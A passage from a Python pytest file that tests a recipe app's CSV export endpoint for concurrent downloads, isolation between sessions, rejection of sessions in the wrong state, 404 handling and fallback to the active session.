        recipe = RecipeSchema(
            title="Concurrent High-Load Recipe, Deluxe",
            description="Testing 50 simultaneous downloads without corruption.",
            ingredients=["2 cups flour", "1 cup butter", "1/2 cup sugar"],
            directions=["1. Mix ingredients.", "2. Bake 20 mins at 350°F."],
            tags=["Stress", "Concurrency"],
            source_notes="Performance Test Suite",
        )
        session.recipes = [recipe]
        exporter = PlanToEatExporter()
        session.csv_content = exporter.export_to_csv_string([recipe])
        session.state = PipelineState.COMPLETED

        async def _download():
            return await adv_client.get(f"/api/export/csv?session_id={session.session_id}")

        tasks = [_download() for _ in range(50)]
        responses = await asyncio.gather(*tasks)

        assert len(responses) == 50
        for r in responses:
            assert r.status_code == 200
            assert "text/csv" in r.headers["content-type"]
            assert "Concurrent High-Load Recipe, Deluxe" in r.text
            assert exporter.validate_csv(r.text) is True

    @pytest.mark.asyncio
    async def test_api_export_csv_concurrent_downloads_across_10_sessions(
        self,
        adv_client: httpx.AsyncClient,
        adv_session_manager: SessionManager,
    ):
        """Stress-test: 10 distinct completed sessions downloaded concurrently (50 total requests).

        Verifies:
        - All 50 requests succeed (HTTP 200).
        - Perfect session data isolation (Session A never returns Session B data).
        """
        sessions = []
        exporter = PlanToEatExporter()

        for i in range(10):
            sid = f"sess_multi_{i:02d}"
            s = adv_session_manager.create_session(session_id=sid)
            recipe = RecipeSchema(
                title=f"Unique Recipe for Session {i:02d}",
                description=f"Isolated session description {i:02d}",
                ingredients=[f"Unique ingredient {i:02d}"],
                directions=[f"1. Unique direction {i:02d}"],
            )
            s.recipes = [recipe]
            s.csv_content = exporter.export_to_csv_string([recipe])
            s.state = PipelineState.COMPLETED
            sessions.append((sid, f"Unique Recipe for Session {i:02d}"))

        # Launch 5 concurrent downloads per session (50 total)
        async def _dl(target_sid: str, expected_title: str):
            res = await adv_client.get(f"/api/export/csv?session_id={target_sid}")
            return target_sid, expected_title, res

        tasks = []
        for sid, expected_title in sessions:
            for _ in range(5):
                tasks.append(_dl(sid, expected_title))

        results = await asyncio.gather(*tasks)
        assert len(results) == 50

        for target_sid, expected_title, res in results:
            assert res.status_code == 200
            assert expected_title in res.text
            # Verify no bleed from other sessions
            for other_sid, other_title in sessions:
                if other_sid != target_sid:
                    assert other_title not in res.text

    @pytest.mark.asyncio
    async def test_api_export_csv_state_guards_reject_incomplete_sessions(
        self,
        adv_client: httpx.AsyncClient,
        adv_session_manager: SessionManager,
    ):
        """GET /api/export/csv returns HTTP 400 when session is in any non-COMPLETED state."""
        invalid_states = [
            PipelineState.IDLE,
            PipelineState.INGESTING,
            PipelineState.FINGERPRINTING,
            PipelineState.CORRELATING,
            PipelineState.HITL_PENDING,
            PipelineState.EXTRACTING,
            PipelineState.EXPORTING,
            PipelineState.CANCELLED,
            PipelineState.FAILED,
        ]

        for idx, state in enumerate(invalid_states):
            sid = f"sess_guard_{idx}_{state.value.lower()}"
            s = adv_session_manager.create_session(session_id=sid)
            s.state = state

            res = await adv_client.get(f"/api/export/csv?session_id={sid}")
            assert res.status_code == 400
            assert "CSV export not ready" in res.json()["detail"]

    @pytest.mark.asyncio
    async def test_api_export_csv_nonexistent_session_returns_404(
        self,
        adv_client: httpx.AsyncClient,
    ):
        """GET /api/export/csv with unknown session_id returns HTTP 404."""
        res = await adv_client.get("/api/export/csv?session_id=sess_does_not_exist_404")
        assert res.status_code == 404
        assert "Session not found" in res.json()["detail"]

    @pytest.mark.asyncio
    async def test_api_export_csv_active_session_fallback(
        self,
        adv_client: httpx.AsyncClient,
        adv_session_manager: SessionManager,
    ):
        """GET /api/export/csv without session_id query param falls back to active session."""
        session = adv_session_manager.create_session(session_id="sess_active_fallback")
        recipe = RecipeSchema(
            title="Active Session Fallback Recipe",
            ingredients=["1 cup sugar"],
            directions=["1. Bake."],
        )
        session.recipes = [recipe]
        exporter = PlanToEatExporter()
        session.csv_content = exporter.export_to_csv_string([recipe])
        session.state = PipelineState.COMPLETED

        # Omit session_id query parameter
        res = await adv_client.get("/api/export/csv")
        assert res.status_code == 200
        assert "Active Session Fallback Recipe" in res.text
